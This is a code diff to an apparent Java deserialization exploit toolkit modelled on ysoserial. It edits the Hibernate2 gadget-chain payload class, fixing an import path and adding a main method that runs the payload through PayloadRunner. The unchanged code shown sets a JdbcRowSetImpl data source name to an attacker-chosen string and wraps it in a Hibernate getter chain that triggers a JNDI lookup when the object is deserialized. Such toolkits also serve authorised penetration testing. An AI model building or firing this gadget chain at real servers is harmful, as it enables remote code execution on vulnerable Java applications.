@@ -4,8 +4,9 @@ package A.R.ysogate.payloads.gadgets;
 import A.R.ysogate.payloads.DynamicDependencies;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.JavaVersion;
+import A.R.ysogate.payloads.utils.JavaVersion;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.rowset.JdbcRowSetImpl;
 
 
@@ -56,5 +57,9 @@ public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
 		JdbcRowSetImpl rs = new JdbcRowSetImpl();
 		rs.setDataSourceName(command);
 		return Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(Hibernate2.class, args);
 	}
 }
